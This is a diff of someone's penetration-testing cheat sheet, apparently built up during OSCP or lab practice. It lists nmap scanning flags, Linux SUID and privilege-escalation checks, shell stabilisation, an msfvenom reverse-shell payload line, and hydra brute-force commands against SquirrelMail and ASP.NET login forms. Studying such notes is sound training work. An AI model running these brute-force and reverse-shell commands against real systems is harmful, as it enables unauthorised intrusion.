@@ -2,27 +2,51 @@
 
 [Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)
 
-## Automatic web enum
+# Automatic web enum
 - dirb | dirsearch
 - linpeas
 - wpsscan -U user -P password
 
-## Basic network
+# Basic network
 - nmap (all ports)
   - script: locate -r nse$ | grep NAME
   - sudo nmap -p- -Pn -sS TARGET -oA AllPort
   - sudo nmap -p -Pn -A 10.10.43.161 -oA Services
+  - -v Version
+  - -A os, in-build scripts
+  - -sC default scripts
 
 - nmap Scrips
   - locate -r nse$ | grep mysql = nmap script
 
-## Pictures
+# Pictures
 - strings
 - exiftool
 
-## Login
+# Login
 - brute force: hydra
 - sqlmap
+
+
+## Linux
+- sudo -l
+- find / -perm -u=s -type f 2>/dev/null
+- find / -type f -perm -04000 -ls 2>/dev/null : SUID
+- psexec.py
+- LinEnum.sh + LinPeas
+- lscpu
+- lsblk -a
+- lsusb -v
+- lspci -t -v
+- fidlist -l
+- Groups: LXD????
+- crontab
+  
+- Shell stabilize
+  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  - python3 -c  import pty;pty.spawn('/bin/bash') 
+  - export TERM=xterm
+
 
 # Buffer overflow
 - Upload file on Immunity Debugger (windows)
@@ -57,25 +81,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread 
 ## Convert python
 dos2unix file
 
-## Linux
-- sudo -l
-- find / -perm -u=s -type f 2>/dev/null
-- find / -type f -perm -04000 -ls 2>/dev/null : SUID
-- psexec.py
-- LinEnum.sh + LinPeas
-- lscpu
-- lsblk -a
-- lsusb -v
-- lspci -t -v
-- fidlist -l
-- Groups: LXD????
-- crontab
-  
-- Shell stabilize
-  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
-  - python3 -c  import pty;pty.spawn('/bin/bash') 
-  - export TERM=xterm
-
 
 ## Payloads
 - msfvenom - reverse -f aspx -o app.aspx
@@ -105,43 +110,3 @@ dos2unix file
 - Enumerate
   - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name
 
-
-```
-docker exec 7b4294cce723 pandoc FOLDER/OSCP_Report_REPORT_THM.md \
--o OSCP_Report_REPORT_THM.pdf \
---from markdown+yaml_metadata_block+raw_html \
---template eisvogel \
---table-of-contents \
---toc-depth 6 \
---number-sections \
---top-level-division=chapter \
---highlight-style pygments \
---resource-path=.:src
-
-
-docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
--o OSCP_Report_REPORT_THM.pdf \
---from markdown+yaml_metadata_block+raw_html \
---template eisvogel \
---table-of-contents \
---toc-depth 6 \
---number-sections \
---top-level-division=chapter \
---highlight-style pygments \
---resource-path=.:src
-
-
-- Docker remove all images
-  - docker rmi $(docker images --filter "dangling=true" -q --no-trunc)
-  - docker rmi $(docker images -q) -f
-  - docker rm $(docker ps -a -q)
-  - docker system prune
-```
-
-hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:quirrelMail - Unknown user or password incorrect.' 
-
-hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
-
-
-
- '/Account/login.aspx:__VIEWSTATE=69yuuyQu%2BFsV858ME9vQPT2LZw6zTdXbSHk3A%2BpwmODQRfrVjVHDJyqKD2jEwtisRgBmegw72mYyWddOv8SbBKXfboHmeJ6uyE9fz%2F0PGi7XvEY%2FBL4FuCFD8KC1ToQMPuotx8rBU5WTryvqCGHd7BXQ1O3r95cK6LRexB05Wbe5SxevwChLklwuogSbnFlmOkZ4vde1YMBy2ZBp%2BoEVR7tuELrzcHoGdl0xKMb8zNINPSGQKKCdIjA6y%2BdpMFTBZukmvHIhdoWpNUyKvV5rLZIjtDnrnv5VuwMtEfIfLBW%2Bl1RvOw6kxTzbS%2B9Q1X3OhKshXBciedwUdsjLj8Q%2Fo5yqN7YSD%2BjCYyvgTe532vXIxSRo&__EVENTVALIDATION=bu7Jb5OyR%2BLA%2FP8nH01STuIGZjnxSHMigCWCJkdcZP11eB7omb%2Be%2Bmo3%2FBTAYLmclw8%2FyUSC6GKgmzbUw1RIujTeng2th885i89lKztlsy9gYH1QQ13t8BvReyN5q9ZHCWV4xV8Nj4FMH%2FGnR8EFXMn74R9lgTdTTS0PmItKQdViP46X&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -f -vV -I
